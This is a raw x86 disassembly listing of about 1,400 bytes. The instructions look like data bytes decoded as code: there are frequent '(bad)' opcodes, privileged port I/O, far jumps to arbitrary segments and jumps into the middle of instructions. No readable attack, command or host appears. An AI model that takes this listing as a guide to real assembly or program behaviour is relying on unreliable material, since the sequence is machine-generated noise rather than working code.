  6ace23:	addr16 jle 0x6ace3d
  6ace26:	dec    eax
  6ace27:	aaa    
  6ace28:	cmp    BYTE PTR [esi-0x69932f0a],al
  6ace2e:	das    
  6ace2f:	out    0x6f,al
  6ace31:	popa   
  6ace32:	jge    0x6acdc7
  6ace34:	imul   esi
  6ace36:	and    al,bh
  6ace38:	ja     0x6ace5b
  6ace3a:	sub    bl,BYTE PTR [edi]
  6ace3c:	xlat   BYTE PTR ds:[ebx]
  6ace3d:	pop    edx
  6ace3e:	jecxz  0x6ace01
  6ace40:	mov    esi,0x38c1dece
  6ace45:	ret    0xccd3
  6ace48:	daa    
  6ace49:	jl     0x6acddf
  6ace4b:	dec    eax
  6ace4c:	xor    cl,bl
  6ace4e:	jecxz  0x6ace03
  6ace50:	mov    bl,0x48
  6ace52:	aam    0xb3
  6ace54:	sub    eax,0x71c357fe
  6ace59:	push   es
  6ace5a:	push   esi
  6ace5b:	mov    al,0x69
  6ace5d:	sar    BYTE PTR [edi-0x6de83628],cl
  6ace63:	imul   esi,DWORD PTR [edx+0x61],0xcfe1d240
  6ace6a:	cmc    
  6ace6b:	push   edx
  6ace6c:	and    esp,eax
  6ace6e:	push   cs
  6ace6f:	xor    DWORD PTR [edx+0x5f],esi
  6ace72:	mov    ecx,esp
  6ace74:	mov    edi,0x583d1cf0
  6ace79:	(bad)  
  6ace7a:	jns    0x6ace0b
  6ace7c:	mov    esp,0xafec4b0f
  6ace81:	in     eax,0x14
  6ace83:	sub    eax,0x2cc2e50d
  6ace88:	aaa    
  6ace89:	pop    edi
  6ace8a:	mov    esi,0x2ad99a73
  6ace8f:	bound  ebp,QWORD PTR [esi+ebp*1-0x6]
  6ace93:	mov    ?,WORD PTR [ebx]
  6ace95:	ds mov dl,0xf2
  6ace98:	mov    ecx,0x2a8f32b1
  6ace9d:	mov    cl,0xad
  6ace9f:	std    
  6acea0:	jns    0x6acee9
  6acea2:	nop
  6acea3:	jns    0x6ace9d
  6acea5:	sub    edx,eax
  6acea7:	xlat   BYTE PTR ds:[ebx]
  6acea8:	push   ds
  6acea9:	shl    esp,0xab
  6aceac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6acead:	mov    esp,0x1daf49cc
  6aceb2:	mov    edx,DWORD PTR [edx+0x7027ba81]
  6aceb8:	inc    eax
  6aceb9:	cmp    al,0x6f
  6acebb:	sbb    al,BYTE PTR [ebp+esi*1-0x57]
  6acebf:	bound  esp,QWORD PTR [edi+ebx*4]
  6acec2:	sub    BYTE PTR [edx],bh
  6acec4:	sbb    dl,ch
  6acec6:	or     eax,0x58c9b706
  6acecb:	xchg   esi,eax
  6acecc:	fabs   
  6acece:	xchg   ebp,eax
  6acecf:	call   0x3f2f:0xad27dda1
  6aced6:	fldcw  WORD PTR [edx+0xb1c6573]
  6acedc:	push   edx
  6acedd:	ja     0x6aceba
  6acedf:	xor    BYTE PTR [esi],bl
  6acee1:	bound  edx,QWORD PTR [eax-0x6]
  6acee4:	push   edx
  6acee5:	iret   
  6acee6:	fwait
  6acee7:	in     eax,dx
  6acee8:	bnd jbe 0x6aceb3
  6aceeb:	imul   ebp,DWORD PTR [edi+ecx*4],0x3a
  6aceef:	and    edi,DWORD PTR [ebx+0x24]
  6acef2:	sbb    al,0xaf
  6acef4:	gs aam 0x51
  6acef7:	dec    esi
  6acef8:	scas   al,BYTE PTR es:[edi]
  6acef9:	jbe    0x6acf46
  6acefb:	test   BYTE PTR [ebx-0x7c],ch
  6acefe:	dec    edx
  6aceff:	push   0xffffffce
  6acf01:	xor    DWORD PTR [edi+0x50087144],ebp
  6acf07:	test   al,0x1c
  6acf09:	ins    DWORD PTR es:[edi],dx
  6acf0a:	sub    ebx,ecx
  6acf0c:	retf   0x6071
  6acf0f:	sbb    al,0x6f
  6acf11:	ret    0x4d41
  6acf14:	icebp  
  6acf15:	adc    esp,DWORD PTR [eax]
  6acf17:	sti    
  6acf18:	mov    dh,0x3
  6acf1a:	pop    eax
  6acf1b:	(bad)  
  6acf1c:	xor    ch,ch
  6acf1e:	fisttp WORD PTR [edx]
  6acf20:	into   
  6acf21:	lock pop edi
  6acf23:	aas    
  6acf24:	mov    esp,0xda729905
  6acf29:	popa   
  6acf2a:	xor    al,0xd1
  6acf2c:	xchg   esi,eax
  6acf2d:	shl    DWORD PTR ds:0x385a61a4,1
  6acf33:	xchg   edi,eax
  6acf34:	mov    DWORD PTR [eax+0x21],esp
  6acf37:	push   edx
  6acf38:	dec    ebx
  6acf39:	cmc    
  6acf3a:	shl    BYTE PTR [edi-0xcb1a55f],cl
  6acf40:	inc    esp
  6acf41:	cdq    
  6acf42:	cs ja  0x6acf8b
  6acf45:	mov    bl,0xce
  6acf47:	ins    BYTE PTR es:[edi],dx
  6acf48:	pushf  
  6acf49:	dec    esi
  6acf4a:	mov    bh,0x5f
  6acf4c:	jle    0x6acf8c
  6acf4e:	rol    BYTE PTR [esi],0xbb
  6acf51:	xchg   esp,eax
  6acf52:	mov    dl,0xb9
  6acf54:	xchg   ecx,eax
  6acf55:	sbb    al,0xb3
  6acf57:	add    eax,ebp
  6acf59:	jo     0x6acf60
  6acf5b:	xor    DWORD PTR [ebp+0x45],ebx
  6acf5e:	cmc    
  6acf5f:	add    BYTE PTR [ecx-0x10],al
  6acf62:	sbb    BYTE PTR [edx+0x6d541b8e],0xe
  6acf69:	test   BYTE PTR [edi+ebp*1-0x22],ah
  6acf6d:	arpl   bx,di
  6acf6f:	std    
  6acf70:	stos   BYTE PTR es:[edi],al
  6acf71:	xor    eax,0x997eaa7
  6acf76:	or     DWORD PTR [ecx+edi*2],0xffffff88
  6acf7a:	mov    edi,0xd40dc87b
  6acf7f:	add    cl,ch
  6acf81:	sbb    al,al
  6acf83:	(bad)  
  6acf84:	jg     0x6acfb4
  6acf86:	test   al,0x80
  6acf88:	popf   
  6acf89:	mov    ecx,0x37b4558
  6acf8e:	and    ebx,DWORD PTR [ebx-0x67a3029e]
  6acf94:	sbb    edi,DWORD PTR [edi-0x9ed1fdc]
  6acf9a:	xlat   BYTE PTR ds:[ebx]
  6acf9b:	pop    esp
  6acf9c:	in     eax,dx
  6acf9d:	aad    0x35
  6acf9f:	out    0xa6,eax
  6acfa1:	adc    eax,0x629fed85
  6acfa6:	add    eax,0xc0f66065
  6acfab:	mov    dh,0x6e
  6acfad:	(bad)  
  6acfaf:	out    dx,al
  6acfb0:	dec    eax
  6acfb1:	jmp    0x6acfb2
  6acfb3:	push   esi
  6acfb5:	or     BYTE PTR [ebx-0x64],0x35
  6acfb9:	mov    esi,0xa6c6ec03
  6acfbe:	pusha  
  6acfbf:	add    BYTE PTR [esi+0x4aee71e6],0x69
  6acfc6:	mov    eax,ebp
  6acfc8:	adc    al,BYTE PTR [edx+ecx*4-0x5fbc3e92]
  6acfcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6acfd0:	pop    es
  6acfd1:	mov    esi,0x4c71bb4
  6acfd6:	nop
  6acfd7:	sbb    DWORD PTR [edx],esp
  6acfd9:	neg    BYTE PTR [esi]
  6acfdb:	aad    0xee
  6acfdd:	cli    
  6acfde:	mov    al,0x2f
  6acfe0:	pop    esp
  6acfe1:	dec    esi
  6acfe2:	into   
  6acfe3:	jmp    0xb816fc49
  6acfe8:	cmc    
  6acfe9:	lods   al,BYTE PTR ds:[esi]
  6acfea:	cmp    DWORD PTR [ecx+0x4bb57bed],esi
  6acff0:	pop    ds
  6acff1:	popf   
  6acff2:	push   ss
  6acff3:	loopne 0x6ad04d
  6acff5:	push   esi
  6acff6:	retf   0xc15d
  6acff9:	xor    DWORD PTR [ebx],eax
  6acffb:	xchg   ebp,ebx
  6acffd:	mov    BYTE PTR [ecx],dl
  6acfff:	xor    BYTE PTR [eax],ah
  6ad001:	mov    eax,0x404782af
  6ad006:	xor    eax,0x21ca4cf1
  6ad00b:	mov    cs,WORD PTR [esi+ecx*2-0x66aab7b4]
  6ad012:	mov    ds:0xda8d14b2,al
  6ad017:	shl    BYTE PTR [edi],1
  6ad019:	mov    esi,0xeccfb78c
  6ad01e:	(bad)  
  6ad01f:	jnp    0x6acfee
  6ad021:	fidiv  WORD PTR [edx+0x1df5886f]
  6ad027:	loopne 0x6ad059
  6ad029:	sub    DWORD PTR [eax+edx*4],ebp
  6ad02c:	mov    bl,0xe8
  6ad02e:	(bad)  
  6ad02f:	sub    ebx,DWORD PTR [esi+0xf4c7384]
  6ad035:	loop   0x6acfbb
  6ad037:	into   
  6ad038:	idiv   DWORD PTR [eax-0x1d846732]
  6ad03e:	sbb    esp,DWORD PTR [esi+0x76]
  6ad041:	mov    bh,0x8e
  6ad043:	icebp  
  6ad044:	in     eax,dx
  6ad045:	imul   ch
  6ad047:	lds    edx,FWORD PTR [esi+ebx*4-0x7f28862e]
  6ad04e:	mov    al,ds:0xc521a28b
  6ad053:	es push 0xd54204bb
  6ad059:	push   0x19f78b42
  6ad05e:	xchg   ecx,eax
  6ad05f:	stos   BYTE PTR es:[edi],al
  6ad060:	dec    ebx
  6ad061:	cld    
  6ad062:	dec    ebx
  6ad063:	mov    ecx,0xd05b9fde
  6ad068:	js     0x6ad0b3
  6ad06a:	int    0xd9
  6ad06c:	push   ss
  6ad06d:	sub    ecx,DWORD PTR [edx-0x5f]
  6ad070:	mov    WORD PTR [edx],fs
  6ad072:	out    dx,al
  6ad073:	mov    ds:0x385afd17,al
  6ad078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ad079:	stc    
  6ad07a:	jns    0x6ad087
  6ad07c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ad07d:	sahf   
  6ad07e:	pop    esp
  6ad07f:	mov    edi,0x18c65d49
  6ad084:	add    eax,0x13cf09c4
  6ad089:	ror    BYTE PTR [esi-0x50],0x2a
  6ad08d:	repnz shl BYTE PTR [ebp-0x52],1
  6ad091:	(bad)  
  6ad092:	not    dl
  6ad094:	adc    BYTE PTR [edx-0x4b0d587a],ch
  6ad09a:	pop    esp
  6ad09b:	int3   
  6ad09c:	fadd   QWORD PTR [ebx+0x3951d67]
  6ad0a2:	lea    ebx,[esi-0x62]
  6ad0a5:	jle    0x6ad05f
  6ad0a7:	test   edx,ecx
  6ad0a9:	mov    ds:0xfca34b03,al
  6ad0ae:	or     ebp,ebx
  6ad0b0:	fist   WORD PTR [ecx-0x602cf94]
  6ad0b6:	mov    esi,0xe1192ba0
  6ad0bb:	(bad)  
  6ad0bc:	std    
  6ad0bd:	ret    
  6ad0be:	push   esi
  6ad0bf:	mov    ds:0xcad317dc,eax
  6ad0c4:	fisttp DWORD PTR [ecx-0x53d4d062]
  6ad0ca:	aas    
  6ad0cb:	pusha  
  6ad0cc:	sbb    edi,ebp
  6ad0ce:	das    
  6ad0cf:	adc    DWORD PTR [edi-0x4e4162bf],eax
  6ad0d5:	inc    ebx
  6ad0d6:	(bad)  
  6ad0d7:	jecxz  0x6ad0f8
  6ad0d9:	mov    ebp,0xc549ef94
  6ad0de:	fldcw  WORD PTR [eax]
  6ad0e0:	retf   0x8167
  6ad0e3:	(bad)  
  6ad0e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ad0e5:	or     DWORD PTR [esi+ecx*8+0x4523df40],edx
  6ad0ec:	jge    0x6ad123
  6ad0ee:	fwait
  6ad0ef:	adc    BYTE PTR ds:0x576064ba,0x80
  6ad0f6:	push   edi
  6ad0f7:	or     bh,BYTE PTR [ebx+eax*2+0x3a]
  6ad0fb:	inc    ebp
  6ad0fc:	loop   0x6ad144
  6ad0fe:	test   al,0xd7
  6ad100:	xchg   edi,eax
  6ad101:	aas    
  6ad102:	fstp   DWORD PTR ds:0x1810ec58
  6ad108:	fdiv   DWORD PTR [ebp-0x50]
  6ad10b:	or     edi,ebp
  6ad10d:	loope  0x6ad09c
  6ad10f:	add    ch,BYTE PTR [ecx-0x2a]
  6ad112:	adc    al,0x4f
  6ad114:	push   edi
  6ad115:	pop    es
  6ad116:	js     0x6ad0e1
  6ad118:	sbb    al,0xc9
  6ad11a:	pushf  
  6ad11b:	jge    0x6ad0b7
  6ad11d:	xlat   BYTE PTR ds:[ebx]
  6ad11e:	pop    esp
  6ad11f:	(bad)  [esp+edx*8-0x35f4da8e]
  6ad126:	add    dh,BYTE PTR ds:0xc3f6afb4
  6ad12c:	scas   eax,DWORD PTR es:[edi]
  6ad12d:	dec    ebp
  6ad12f:	push   es
  6ad130:	lods   eax,DWORD PTR ds:[esi]
  6ad131:	dec    eax
  6ad132:	in     al,dx
  6ad133:	imul   eax,DWORD PTR [ecx-0x1a4c7338],0x4ab536ee
  6ad13d:	and    eax,DWORD PTR [ebx]
  6ad13f:	jns    0x6ad15b
  6ad141:	ret    0x4b0e
  6ad144:	mov    eax,0x8038d41c
  6ad149:	jmp    0x6ad107
  6ad14b:	or     ecx,ebx
  6ad14d:	jbe    0x6ad147
  6ad14f:	mov    al,0x8
  6ad151:	es int3 
  6ad153:	sub    eax,0xfa89d3ca
  6ad158:	adc    ah,cl
  6ad15a:	aaa    
  6ad15b:	pop    ecx
  6ad15c:	add    DWORD PTR [ecx+0x45d8837e],edi
  6ad162:	gs movzx eax,al
  6ad166:	lea    esp,[ecx+edx*2+0x201fdbbb]
  6ad16d:	mov    al,0xa2
  6ad16f:	xchg   ecx,eax
  6ad170:	jmp    0x2658:0x81a0df36
  6ad177:	stos   DWORD PTR es:[edi],eax
  6ad178:	sub    DWORD PTR [edx-0xc531776],eax
  6ad17e:	mov    dl,0x37
  6ad180:	hlt    
  6ad181:	(bad)  
  6ad182:	jg     0x6ad19f
  6ad184:	cmp    BYTE PTR [edx+eiz*8+0x4f],bh
  6ad188:	push   cs
  6ad189:	push   ebp
  6ad18a:	daa    
  6ad18b:	xchg   DWORD PTR [ebx+0x4d6125f9],eax
  6ad191:	mov    dh,0x10
  6ad193:	and    eax,0x79acad9c
  6ad198:	es mov esi,0x402af99c
  6ad19e:	pop    esp
  6ad19f:	lea    esi,[edx+0xe]
  6ad1a2:	sub    al,BYTE PTR ds:0x1128d1e2
  6ad1a8:	pushf  
  6ad1a9:	int    0xb8
  6ad1ab:	daa    
  6ad1ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ad1ad:	adc    al,0xd3
  6ad1af:	fst    QWORD PTR [eax]
  6ad1b1:	sahf   
  6ad1b2:	ins    DWORD PTR es:[edi],dx
  6ad1b3:	retf   0x9d77
  6ad1b6:	fistp  WORD PTR [ebx]
  6ad1b8:	bound  ecx,QWORD PTR [eax-0x81e71c6]
  6ad1be:	cli    
  6ad1bf:	pop    eax
  6ad1c0:	or     dh,al
  6ad1c2:	adc    eax,0x438ad60b
  6ad1c7:	ins    DWORD PTR es:[edi],dx
  6ad1c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ad1c9:	jns    0x6ad1d7
  6ad1cb:	fiadd  DWORD PTR [esp+ecx*2-0x133847f3]
  6ad1d2:	xchg   ebp,eax
  6ad1d3:	out    dx,eax
  6ad1d4:	inc    esp
  6ad1d5:	pop    eax
  6ad1d6:	sub    eax,0x8af52f76
  6ad1db:	jbe    0x6ad1db
  6ad1dd:	(bad)  
  6ad1de:	or     al,0x9f
  6ad1e1:	mov    ch,BYTE PTR [ebx+eiz*8+0x4d]
  6ad1e5:	loop   0x6ad1c4
  6ad1e7:	lods   eax,DWORD PTR ds:[esi]
  6ad1e8:	sub    eax,DWORD PTR [ebx+0x755bb3a3]
  6ad1ee:	xor    al,0x6
  6ad1f0:	push   cs
  6ad1f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ad1f2:	mov    eax,ds:0x7c12f733
  6ad1f7:	or     al,0x47
  6ad1f9:	div    DWORD PTR [ecx+0x7e964bb0]
  6ad1ff:	sti    
  6ad200:	test   eax,0x410f5220
  6ad205:	or     al,0x48
  6ad207:	aam    0x28
  6ad209:	cli    
  6ad20a:	push   ds
  6ad20b:	xchg   edx,eax
  6ad20c:	fst    DWORD PTR [edx]
  6ad20e:	pop    ebx
  6ad20f:	gs inc edi
  6ad211:	inc    edi
  6ad212:	inc    ebx
  6ad213:	fwait
  6ad214:	sub    DWORD PTR [ecx-0x6f],ebp
  6ad217:	xchg   esi,eax
  6ad218:	sbb    al,0x32
  6ad21a:	jp     0x6ad25d
  6ad21c:	shl    BYTE PTR [edx-0x45],0xd2
  6ad220:	(bad)  
  6ad221:	mov    cs,WORD PTR [eax-0x2b17dcfc]
  6ad227:	push   eax
  6ad228:	popf   
  6ad229:	inc    ebp
  6ad22a:	mov    edx,cs
  6ad22c:	push   esi
  6ad22d:	pusha  
  6ad22e:	aam    0xa8
  6ad230:	cwde   
  6ad231:	mov    edi,0xfec144f7
  6ad236:	ds xchg ebx,eax
  6ad238:	cmp    BYTE PTR ds:0x7df9a295,cl
  6ad23e:	push   cs
  6ad23f:	cdq    
  6ad240:	dec    esi
  6ad241:	mov    ebx,0xd98cebd2
  6ad246:	mov    bh,0x2e
  6ad248:	(bad)  
  6ad249:	retf   0xe29e
  6ad24c:	inc    ecx
  6ad24d:	jmp    0xfb:0x2c09d225
  6ad254:	jns    0x6ad1d8
  6ad256:	ret    0xefda
  6ad259:	es loope 0x6ad277
  6ad25c:	test   eax,0x752c5e98
  6ad261:	jno    0x6ad242
  6ad263:	cmp    ch,BYTE PTR [esp+ebp*4]
  6ad266:	enter  0x945f,0xc9
  6ad26a:	cs sbb edi,0x3f8dbec6
  6ad271:	mov    ebx,DWORD PTR [edx-0x4b33944a]
  6ad277:	in     al,0xc9
  6ad279:	push   eax
  6ad27a:	xchg   edx,eax
  6ad27b:	imul   ebp,DWORD PTR [esi+0x5d],0x6cc21495
  6ad282:	cmp    eax,0xb602a531
  6ad287:	ror    edi,0xef
  6ad28a:	jo     0x6ad2d2
  6ad28c:	xchg   ebp,eax
  6ad28d:	mov    ebp,0xbea2a435
  6ad292:	mov    ebx,0xd70ae15d
  6ad297:	jb     0x6ad274
  6ad299:	mov    BYTE PTR [ebp+0x3561f8c],cl
  6ad29f:	(bad)  
  6ad2a0:	out    dx,al
  6ad2a1:	inc    ecx
  6ad2a2:	fld    QWORD PTR es:[ecx-0x3f]
  6ad2a6:	cmp    ah,BYTE PTR [edi]
  6ad2a8:	cmp    al,BYTE PTR [ecx]
  6ad2aa:	xor    eax,0xca931f5e
  6ad2af:	(bad)  
  6ad2b0:	int    0xf4
  6ad2b2:	loopne 0x6ad267
  6ad2b4:	and    dh,BYTE PTR ds:0x9593a762
  6ad2ba:	mov    esi,0x74364185
  6ad2bf:	int3   
  6ad2c0:	sub    al,0x38
  6ad2c2:	xchg   ebx,eax
  6ad2c3:	bound  edi,QWORD PTR [edx-0x45]
  6ad2c6:	adc    ah,cl
  6ad2c8:	xor    BYTE PTR [esi-0x37],bl
  6ad2cb:	fild   WORD PTR [bx+di]
  6ad2ce:	es xor eax,0xdeb75e78
  6ad2d4:	cmp    cx,sp
  6ad2d7:	(bad)  ds:0x679f8731
  6ad2dd:	pop    ds
  6ad2de:	in     eax,dx
  6ad2df:	xor    eax,0x6bd57a0f
  6ad2e4:	or     esp,DWORD PTR [edi]
  6ad2e6:	push   0x5476f970
  6ad2eb:	push   edx
  6ad2ec:	xor    cl,BYTE PTR [ebp+eax*8-0x2daab523]
  6ad2f3:	jae    0x6ad2d6
  6ad2f5:	xor    ch,BYTE PTR [esi-0x3]
  6ad2f8:	pusha  
  6ad2f9:	test   DWORD PTR [ebx+0x9f21284],ebp
  6ad2ff:	cmp    al,0xb
  6ad301:	cdq    
  6ad302:	push   esp
  6ad303:	fidiv  DWORD PTR [ebx+eiz*8+0x29]
  6ad307:	out    dx,al
  6ad308:	cmp    DWORD PTR [ecx+0x5],ecx
  6ad30b:	daa    
  6ad30c:	out    dx,al
  6ad30d:	inc    ecx
  6ad30e:	jb     0x6ad29f
  6ad310:	and    al,0xc
  6ad312:	imul   ebx,DWORD PTR [eax],0xffffffd2
  6ad315:	loopne 0x6ad2a9
  6ad317:	cmp    ch,bl
  6ad319:	pop    esi
  6ad31a:	add    al,BYTE PTR [ebx-0x307a6fcb]
  6ad320:	mov    eax,0xd9f84243
  6ad325:	cdq    
  6ad326:	push   ds
  6ad327:	sbb    edi,esi
  6ad329:	outs   dx,DWORD PTR ds:[esi]
  6ad32a:	and    eax,0x3a25fda1
  6ad32f:	mov    ecx,0x769d4fe5
  6ad334:	mov    dl,0x3f
  6ad336:	mov    fs,WORD PTR [edx]
  6ad338:	outs   dx,BYTE PTR ds:[esi]
  6ad339:	out    0xd3,eax
  6ad33b:	push   0x865a690e
  6ad340:	mov    ecx,ecx
  6ad342:	inc    DWORD PTR [ebx]
  6ad344:	mov    cl,0x67
  6ad346:	push   ds
  6ad347:	(bad)  
  6ad348:	jg     0x6ad323
  6ad34a:	mov    WORD PTR [esp+ecx*2-0x4d],fs
  6ad34e:	xor    al,BYTE PTR [ecx-0x369105c5]
  6ad354:	inc    BYTE PTR [ecx-0x2e364c9e]
  6ad35a:	mov    al,BYTE PTR [ebx+0x5e]
  6ad35d:	cmp    BYTE PTR [edi+0xd],0xf6
  6ad361:	mov    WORD PTR [ecx-0x4],fs
  6ad364:	ret    
  6ad365:	push   ss
  6ad366:	pop    es
  6ad367:	ja     0x6ad3b0
  6ad369:	movups xmm0,XMMWORD PTR [ebx]
  6ad36c:	add    cl,BYTE PTR [ecx-0x6be28273]
  6ad372:	push   esi
  6ad373:	cmp    DWORD PTR [edi-0x39],ebp
  6ad376:	push   ebx
  6ad377:	jg     0x6ad392
  6ad379:	sub    eax,0x6f041ce0
  6ad37e:	push   es
  6ad37f:	add    DWORD PTR [ebp-0x489d06e2],eax
  6ad385:	(bad)  [ecx+0x7d33302b]
  6ad38b:	fsubp  st(0),st
  6ad38d:	mov    edi,esi
  6ad38f:	mov    WORD PTR ds:0x4c7c820f,gs
  6ad395:	jp     0x6ad340
  6ad397:	xor    edx,0xf48d19ad
  6ad39d:	xchg   esi,eax
  6ad39e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ad39f:	dec    ebp
  6ad3a0:	popf   
  6ad3a1:	repz jbe 0x6ad341
  6ad3a4:	fs pop es
  6ad3a6:	arpl   WORD PTR ds:0xce87afff,di
  6ad3ac:	test   ebx,edx
  6ad3ae:	cmc    
  6ad3af:	loop   0x6ad367
  6ad3b1:	push   edi
  6ad3b2:	and    dl,BYTE PTR [esp+eiz*8+0x6ea390f]
  6ad3b9:	mov    eax,ds:0xa09d8225
  6ad3be:	adc    eax,0x522a27f5
  6ad3c3:	lock inc ecx
  6ad3c5:	or     eax,DWORD PTR [ebx-0x1d5b1f82]
  6ad3cb:	xlat   BYTE PTR ds:[ebx]
  6ad3cc:	xor    DWORD PTR [edx-0x24],ecx
  6ad3cf:	xor    eax,0xf944d7a6
  6ad3d4:	inc    esp
  6ad3d5:	les    esi,FWORD PTR [eax+0x5f26d89e]
  6ad3db:	out    dx,al
  6ad3dc:	dec    ecx
  6ad3dd:	sub    dh,bh
  6ad3df:	sub    DWORD PTR [edi-0x5a],ebx
  6ad3e2:	dec    esi
  6ad3e3:	inc    esi
  6ad3e4:	or     al,0x86
  6ad3e6:	push   ss
  6ad3e7:	in     eax,dx
  6ad3e8:	(bad)  
  6ad3e9:	stos   DWORD PTR es:[edi],eax
  6ad3ea:	xor    dl,BYTE PTR [ebx]
  6ad3ec:	push   0x3d
  6ad3ee:	out    dx,eax
  6ad3ef:	push   eax
  6ad3f0:	lds    esi,FWORD PTR [edi*4-0x53f24afb]
  6ad3f7:	std    
  6ad3f8:	jno    0x6ad3f5
  6ad3fa:	dec    ebx
  6ad3fb:	jp     0x6ad3fc
  6ad3fd:	push   di
  6ad3ff:	ror    dh,0xe0
  6ad402:	mov    gs,edx
  6ad404:	(bad)  
  6ad406:	pushf  
  6ad407:	push   edi
  6ad408:	xchg   esp,eax
  6ad409:	jp     0x6ad47b
  6ad40b:	cmp    dh,BYTE PTR [edx+0x2212ad16]
  6ad411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ad412:	dec    ecx
  6ad413:	jmp    0xd8d9:0x13ef5505
  6ad41a:	imul   eax,DWORD PTR [ebx],0x43feb2f0
  6ad420:	data16 and BYTE PTR [ecx-0x4a655f27],dl
  6ad427:	ins    BYTE PTR es:[edi],dx
  6ad428:	or     al,0xf4
  6ad42a:	psubb  mm0,QWORD PTR [ebx]
  6ad42d:	add    eax,edx
  6ad42f:	out    dx,eax
  6ad430:	xor    dh,BYTE PTR [edi]
  6ad432:	adc    cl,bl
  6ad434:	sub    edx,DWORD PTR [ebx+0x11]
  6ad437:	cld    
  6ad438:	mov    bh,bh
  6ad43a:	inc    ecx
  6ad43b:	mov    ecx,0xeb2354
  6ad440:	adc    DWORD PTR [eax-0x26],edi
  6ad443:	cmp    ah,BYTE PTR [ebx-0x1a]
  6ad446:	cmp    al,BYTE PTR [edx+0x7e]
  6ad449:	std    
  6ad44a:	popa   
  6ad44b:	adc    DWORD PTR [edi+0x75],esp
  6ad44e:	sbb    BYTE PTR [ecx+0x6b],dl
  6ad451:	mov    eax,0x34ee119a
  6ad456:	sti    
  6ad457:	(bad)  [edi]
  6ad459:	shl    ebx,1
  6ad45b:	pop    ebp
  6ad45c:	shl    edi,0x41
  6ad45f:	ret    
  6ad460:	hlt    
  6ad461:	out    dx,al
  6ad462:	jg     0x6ad49d
  6ad464:	xchg   ebx,eax
  6ad465:	mov    bh,0x9d
  6ad467:	mov    eax,ebx
  6ad469:	mov    ecx,0x4a176bbf
  6ad46e:	pusha  
  6ad46f:	sbb    ecx,esp
  6ad471:	fisub  DWORD PTR [esi-0xc]
  6ad474:	sbb    BYTE PTR [ebx-0x73ee359e],dl
  6ad47a:	out    dx,eax
  6ad47b:	cs jmp 0x856:0xa98b2358
  6ad483:	iret   
  6ad484:	xor    dl,dl
  6ad486:	mov    eax,0x1ba4622a
  6ad48b:	fidivr DWORD PTR [esi-0xce8bedc]
  6ad491:	imul   ecx,DWORD PTR [edi+edi*2],0xffffffe8
  6ad495:	cmp    bl,dl
  6ad497:	stc    
  6ad498:	inc    ebp
  6ad499:	sbb    BYTE PTR [edi+0x252adf3b],0x76
  6ad4a0:	jge    0x6ad517
  6ad4a2:	inc    ecx
  6ad4a3:	test   ecx,eax
  6ad4a5:	mov    ds:0xca03e148,eax
  6ad4aa:	shl    DWORD PTR es:[esi-0x4402db47],1
  6ad4b1:	out    0x4f,eax
  6ad4b3:	repnz jecxz 0x6ad4f9
  6ad4b6:	adc    al,0xcd
  6ad4b8:	add    BYTE PTR [eax],bl
  6ad4ba:	lock daa 
  6ad4bc:	jo     0x6ad464
  6ad4be:	push   cs
  6ad4bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ad4c0:	js     0x6ad4c9
  6ad4c2:	sub    dl,dh
  6ad4c4:	in     al,dx
  6ad4c5:	xchg   edi,eax
  6ad4c6:	lahf   
  6ad4c7:	outs   dx,BYTE PTR ds:[esi]
  6ad4c8:	push   ds
  6ad4c9:	and    al,0x19
  6ad4cb:	bound  edi,QWORD PTR [eax-0x71]
  6ad4ce:	jne    0x6ad469
  6ad4d0:	in     eax,0x32
  6ad4d2:	mov    edx,0xc2a0410a
  6ad4d7:	stos   BYTE PTR es:[edi],al
  6ad4d8:	std    
  6ad4d9:	sbb    bl,BYTE PTR [ecx]
  6ad4db:	enter  0x5c9f,0x29
  6ad4df:	jno    0x6ad4c5
  6ad4e1:	in     eax,0xff
  6ad4e3:	fdiv   st(5),st
  6ad4e5:	jle    0x6ad4fd
  6ad4e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ad4e8:	(bad)  
  6ad4e9:	dec    esi
  6ad4ea:	adc    DWORD PTR [edx-0x1],0xffffffe2
  6ad4ee:	mov    bl,0x84
  6ad4f0:	mov    esp,0x339ade27
  6ad4f5:	sbb    edi,DWORD PTR [eax-0x1d00dd56]
  6ad4fb:	pushf  
  6ad4fc:	dec    edi
  6ad4fd:	lods   al,BYTE PTR ds:[esi]
  6ad4fe:	mov    ebp,0x3a3bc107
  6ad503:	xchg   ebx,eax
  6ad504:	shl    DWORD PTR [esi],cl
  6ad506:	cmp    DWORD PTR [ecx-0xd00785],0x7c35c443
  6ad510:	(bad)  
  6ad511:	mov    esp,0xe04676a7
  6ad516:	push   es
  6ad517:	dec    ebp
  6ad518:	inc    ecx
  6ad519:	mov    eax,ds:0x8cbf3452
  6ad51e:	adc    eax,0xbd71ff2
  6ad523:	mov    gs,WORD PTR [eax-0x42922637]
  6ad529:	pop    ecx
  6ad52a:	or     eax,DWORD PTR [ebx-0x56]
  6ad52d:	mov    edx,0x5a54a818
  6ad532:	sub    DWORD PTR [eax-0x3bfd0925],esp
  6ad538:	shl    DWORD PTR [ecx+eax*2-0x7d7b7139],cl
  6ad53f:	push   ds
  6ad540:	mov    dh,0x65
  6ad542:	add    esp,ebp
  6ad544:	push   esp
  6ad545:	mov    eax,0xc99999db
  6ad54a:	jo     0x6ad4e4
  6ad54c:	bound  edx,QWORD PTR [eax+0x55eb79a4]
  6ad552:	ins    DWORD PTR es:[edi],dx
  6ad553:	fcmovbe st,st(6)
  6ad555:	cli    
  6ad556:	scas   al,BYTE PTR es:[edi]
  6ad557:	add    eax,eax
  6ad559:	aam    0x3e
  6ad55b:	jg     0x6ad586
  6ad55d:	dec    DWORD PTR [ecx]
  6ad55f:	mov    bl,BYTE PTR [edi]
  6ad561:	mov    al,0x59
  6ad563:	(bad)  
  6ad564:	jb     0x6ad5d4
  6ad566:	adc    DWORD PTR [edi+ebp*1+0x6f],edi
  6ad56a:	int    0xa6
  6ad56c:	or     DWORD PTR [esi+0x26],0x4a
